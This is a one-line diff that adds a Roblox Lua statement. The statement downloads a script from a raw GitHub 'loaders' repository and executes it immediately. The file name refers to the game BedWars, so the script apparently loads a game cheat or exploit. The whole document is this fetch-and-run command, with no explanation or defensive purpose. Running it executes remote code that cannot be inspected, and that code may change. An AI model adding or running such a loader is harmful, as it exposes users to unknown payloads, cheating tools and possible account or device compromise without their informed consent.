@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/bedwars-halloween-pt-1-spam7-u71z9z5jiji9fj.lua"))()
